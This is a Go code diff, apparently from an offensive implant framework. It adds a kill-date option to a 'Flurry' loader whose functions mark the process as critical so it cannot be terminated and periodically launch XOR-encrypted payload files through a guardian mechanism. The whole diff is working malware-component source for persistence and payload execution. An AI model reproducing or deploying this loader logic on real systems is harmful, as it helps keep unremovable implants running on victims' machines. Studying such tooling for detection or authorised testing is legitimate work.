@@ -39,6 +39,8 @@ import (
 //   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
 //               (Windows only obviously). And will make itself un-terminatable
 //               while running.
+//   killdate - If this is not zero, this specifies the date when this Flurry will
+//               stop functioning. This is represented in Unix epoch time.
 //   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
 //   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
 //               THIS NAME, it will be formatted based on the Linker type.
@@ -47,12 +49,16 @@ import (
 //   files    - List of files to check against. Each file will be checked in a
 //               random order and is expected to be encrypted using the supplied
 //               key value.
-func Start(critical bool, l man.Linker, guard string, key []byte, files []string) {
+func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	defer func() {
 		if err := recover(); err != nil {
 			device.GoExit()
 		}
 	}()
+	if killdate != 0 && time.Now().After(time.Unix(killdate, 0)) {
+		device.GoExit()
+	}
+	limits.Ignore()
 	var z bool
 	if time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(200))); critical {
 		z, _ = device.SetCritical(true)
@@ -76,6 +82,8 @@ func Start(critical bool, l man.Linker, guard string, key []byte, files []string
 //   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
 //               (Windows only obviously). And will make itself un-terminatable
 //               while running.
+//   killdate - If this is not zero, this specifies the date when this Flurry will
+//               stop functioning. This is represented in Unix epoch time.
 //   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
 //   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
 //               THIS NAME, it will be formatted based on the Linker type.
@@ -84,9 +92,9 @@ func Start(critical bool, l man.Linker, guard string, key []byte, files []string
 //   files    - List of files to check against. Each file will be checked in a
 //               random order and is expected to be encrypted using the supplied
 //               key value.
-func Loop(wait time.Duration, critical bool, l man.Linker, guard string, key []byte, files []string) {
+func Loop(wait time.Duration, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	if wait <= 0 {
-		Start(critical, l, guard, key, files)
+		Start(critical, killdate, l, guard, key, files)
 		return
 	}
 	defer func() {
@@ -95,6 +103,12 @@ func Loop(wait time.Duration, critical bool, l man.Linker, guard string, key []b
 			return
 		}
 	}()
+	var k time.Time
+	if killdate != 0 {
+		if k = time.Unix(killdate, 0); time.Now().After(k) {
+			device.GoExit()
+		}
+	}
 	limits.Ignore()
 	var (
 		x, y = context.WithCancel(context.Background())
@@ -112,7 +126,10 @@ loop:
 		select {
 		case <-w:
 			break loop
-		case <-t.C:
+		case n := <-t.C:
+			if killdate != 0 && !k.IsZero() && n.After(k) {
+				break loop
+			}
 			if atomic.LoadUint32(&s) == 1 {
 				// NOTE(dij): We don't swap here to prevent overriting the
 				//            one in the goroutine.
@@ -149,6 +166,8 @@ loop:
 //   critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
 //               (Windows only obviously). And will make itself un-terminatable
 //               while running.
+//   killdate - If this is not zero, this specifies the date when this Flurry will
+//               stop functioning. This is represented in Unix epoch time.
 //   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
 //   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
 //               THIS NAME, it will be formatted based on the Linker type.
@@ -156,13 +175,22 @@ loop:
 //               data in the supplied files list.
 //   files    - List of files to check against. Each file will be checked in a
 //               random order
-func Daemon(t time.Duration, name string, critical bool, l man.Linker, guard string, key []byte, files []string) {
+func Daemon(t time.Duration, name string, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
 	var z bool
 	if critical {
 		z, _ = device.SetCritical(true)
 	}
+	var k time.Time
+	if killdate != 0 {
+		if k = time.Unix(killdate, 0); time.Now().After(k) {
+			device.GoExit()
+		}
+	}
+	limits.Ignore()
 	device.DaemonTicker(name, t, func(x context.Context) error {
-		limits.MemorySweep(x)
+		if limits.MemorySweep(x); killdate != 0 && !k.IsZero() && time.Now().After(k) {
+			return device.ErrQuit
+		}
 		man.WakeMultiFile(l, guard, crypto.XOR(key), files)
 		return nil
 	})
